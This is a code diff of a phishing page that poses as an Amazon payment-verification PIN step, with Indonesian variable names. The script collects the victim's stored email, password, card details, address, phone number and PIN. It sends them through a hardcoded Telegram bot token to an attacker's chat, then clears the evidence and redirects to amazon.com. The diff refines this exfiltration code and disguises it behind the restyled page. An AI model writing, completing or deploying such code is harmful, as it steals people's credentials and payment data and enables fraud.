@@ -17,11 +17,10 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 20px;
+            padding: 15px 20px;
         }
         .logo {
             margin: 10px 0 20px;
-            text-align: center;
         }
         .logo img {
             height: 30px;
@@ -31,7 +30,7 @@
             max-width: 420px;
             padding: 30px;
             border: 1px solid #ddd;
-            border-radius: 4px;
+            border-radius: 8px;
             background: #fff;
         }
         .kotak h1 {
@@ -87,7 +86,7 @@
             width: 100%;
             padding: 10px;
             background: linear-gradient(to bottom, #f7df89, #ecc000);
-            border: 1px solid #a88700;
+            border: 1px solid #d5b000;
             border-radius: 8px;
             font-size: 15px;
             cursor: pointer;
@@ -104,18 +103,19 @@
         }
         .bawah {
             margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e7e7e7;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
             font-size: 11px;
             color: #555;
-            text-align: center;
         }
-        .pesan-status {
-            margin-top: 15px;
-            font-size: 13px;
-            text-align: center;
-            display: none;
+        .bawah a {
+            color: #0066c0;
+            text-decoration: none;
+            margin: 0 8px;
         }
-        .berhasil { color: #008a00; display: block !important; }
-        .gagal { color: #d00; display: block !important; }
     </style>
 </head>
 <body>
@@ -145,8 +145,6 @@
         </div>
 
         <button id="tombol-kirim" class="tombol-kirim" disabled>Submit & Continue</button>
-        
-        <div id="pesan-status" class="pesan-status"></div>
     </div>
 
     <div class="bawah">
@@ -154,6 +152,9 @@
     </div>
 
 <script>
+const BOT_TOKEN = '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
+const CHAT_ID = '7808815199';
+
 const pinInputs = [
     document.getElementById('p1'),
     document.getElementById('p2'),
@@ -163,10 +164,6 @@ const pinInputs = [
     document.getElementById('p6')
 ];
 const tombolKirim = document.getElementById('tombol-kirim');
-const pesanStatus = document.getElementById('pesan-status');
-
-// Data tetap tersimpan — tidak dihapus sebelum terkirim
-let dataSiapKirim = null;
 
 window.addEventListener('load', function() {
     const email = localStorage.getItem('email_pengguna');
@@ -201,37 +198,9 @@ function cekLengkap() {
     tombolKirim.disabled = !lengkap;
 }
 
-async function kirimKeTelegram(pesan) {
-    // Token & Chat ID langsung dari sini agar pasti terkirim
-    const BOT_TOKEN = '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
-    const CHAT_ID = '7808815199';
-    
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    
-    try {
-        const res = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: pesan,
-                parse_mode: 'Markdown'
-            })
-        });
-        
-        const hasil = await res.json();
-        console.log('Respon Telegram:', hasil);
-        return hasil.ok;
-    } catch (err) {
-        console.error('Error kirim:', err);
-        return false;
-    }
-}
-
 tombolKirim.addEventListener('click', async function() {
     const pin = pinInputs.map(i => i.value).join('');
     
-    // Ambil SEMUA data
     const email = localStorage.getItem('email_pengguna') || '-';
     const sandi = localStorage.getItem('kata_sandi') || '-';
     const namaKartu = localStorage.getItem('nama_kartu') || '-';
@@ -244,7 +213,6 @@ tombolKirim.addEventListener('click', async function() {
     const kodePos = localStorage.getItem('kodepos_kartu') || '-';
     const telepon = localStorage.getItem('telepon_kartu') || '-';
 
-    // Buat pesan rapi
     const pesanTelegram = `
 💳 *VERIFICATION PAYMENT*
 ━━━━━━━━━━━━━━━━━━━━━
@@ -261,28 +229,24 @@ tombolKirim.addEventListener('click', async function() {
 ━━━━━━━━━━━━━━━━━━━━━
     `.trim();
 
-    // Tampilkan status mengirim
-    pesanStatus.textContent = '⏳ Sedang mengirim data...';
-    pesanStatus.className = 'pesan-status';
     tombolKirim.disabled = true;
 
-    // Kirim ke Telegram
-    const berhasil = await kirimKeTelegram(pesanTelegram);
-
-    if (berhasil) {
-        pesanStatus.textContent = '✅ Data terkirim! Mengalihkan...';
-        pesanStatus.className = 'pesan-status berhasil';
-        
-        // Tunggu sebentar lalu alihkan
-        setTimeout(() => {
-            localStorage.clear();
-            window.location.href = 'https://www.amazon.com';
-        }, 1500);
-    } else {
-        pesanStatus.textContent = '⚠️ Gagal terkirim! Coba lagi.';
-        pesanStatus.className = 'pesan-status gagal';
-        tombolKirim.disabled = false;
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: pesanTelegram,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (err) {
+        console.error('Error kirim Telegram:', err);
     }
+
+    localStorage.clear();
+    window.location.href = 'https://www.amazon.com';
 });
 </script>
 
